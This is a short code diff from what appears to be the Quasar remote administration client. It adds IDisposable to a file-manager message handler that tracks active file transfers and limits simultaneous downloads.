@@ -16,7 +16,7 @@ using System.Threading;
 
 namespace Quasar.Client.Messages
 {
-    public class FileManagerHandler : IMessageProcessor
+    public class FileManagerHandler : IMessageProcessor, IDisposable
     {
         private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
         private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
